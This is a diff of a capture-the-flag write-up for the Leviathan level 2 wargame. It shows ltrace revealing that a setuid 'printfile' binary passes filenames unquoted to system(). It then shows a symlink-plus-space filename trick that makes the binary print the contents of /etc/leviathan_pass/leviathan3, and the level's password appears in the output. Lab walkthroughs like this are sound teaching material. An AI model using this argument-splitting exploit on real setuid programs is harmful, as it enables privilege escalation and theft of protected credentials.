@@ -73,19 +73,19 @@ printfile: setuid ELF 32-bit LSB  executable, Intel 80386, version 1 (SYSV), dyn
 leviathan2@melinda:~$ ./printfile 
 *** File Printer ***
 Usage: ./printfile filename
-leviathan2@melinda:~$ touch /tmp/n00bsbfile
-leviathan2@melinda:~$ ltrace ./printfile /tmp/n00bsbfile
+leviathan2@melinda:~$ touch /tmp/318brfile
+leviathan2@melinda:~$ ltrace ./printfile /tmp/318brfile
 __libc_start_main(0x804852d, 2, 0xffffd654, 0x8048600 <unfinished ...>
-access("/tmp/n00bsbfile", 4)                                                                                              = 0
-snprintf("/bin/cat /tmp/n00bsbfile", 511, "/bin/cat %s", "/tmp/n00bsbfile")                                               = 24
-system("/bin/cat /tmp/n00bsbfile" <no return ...>
+access("/tmp/318brfile", 4)                                                                                              = 0
+snprintf("/bin/cat /tmp/318brfile", 511, "/bin/cat %s", "/tmp/318brfile")                                               = 24
+system("/bin/cat /tmp/318brfile" <no return ...>
 --- SIGCHLD (Child exited) ---
 <... system resumed> )                                                                                                    = 0
 +++ exited (status 0) +++
-leviathan2@melinda:~$ rm /tmp/n00bsbfile
-leviathan2@melinda:~$ ln -s /etc/leviathan_pass/leviathan3 /tmp/n00bsbfile
-leviathan2@melinda:~$ touch /tmp/n00bsbfile\ blabla
-leviathan2@melinda:~$ ./printfile /tmp/n00bsbfile\ blabla
+leviathan2@melinda:~$ rm /tmp/318brfile
+leviathan2@melinda:~$ ln -s /etc/leviathan_pass/leviathan3 /tmp/318brfile
+leviathan2@melinda:~$ touch /tmp/318brfile\ blabla
+leviathan2@melinda:~$ ./printfile /tmp/318brfile\ blabla
 Ahdiemoo1j
 /bin/cat: blabla: No such file or directory
 ```
